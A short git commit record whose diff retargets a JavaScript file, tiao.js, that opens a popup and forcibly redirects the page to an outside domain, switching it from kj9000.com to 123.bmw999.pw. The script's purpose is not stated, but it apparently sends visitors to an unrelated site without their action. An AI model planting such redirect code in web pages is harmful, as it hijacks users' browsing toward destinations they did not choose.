4dc85d70a994c5eac6efcc8fb58dce2f617aac77
qq794307383 <qq794307383@163.com>
2016-12-24 10:22:27 +0800

    Update tiao.js

--- j/tiao.js
+++ j/tiao.js
@@ -1,2 +1,2 @@
- window.open ("http://www.kj9000.com/#388"); 
- window.location.href="http://www.kj9000.com/#388"; 
+ window.open ("http://123.bmw999.pw/#388"); 
+ window.location.href="http://123.bmw999.pw/#388"; 
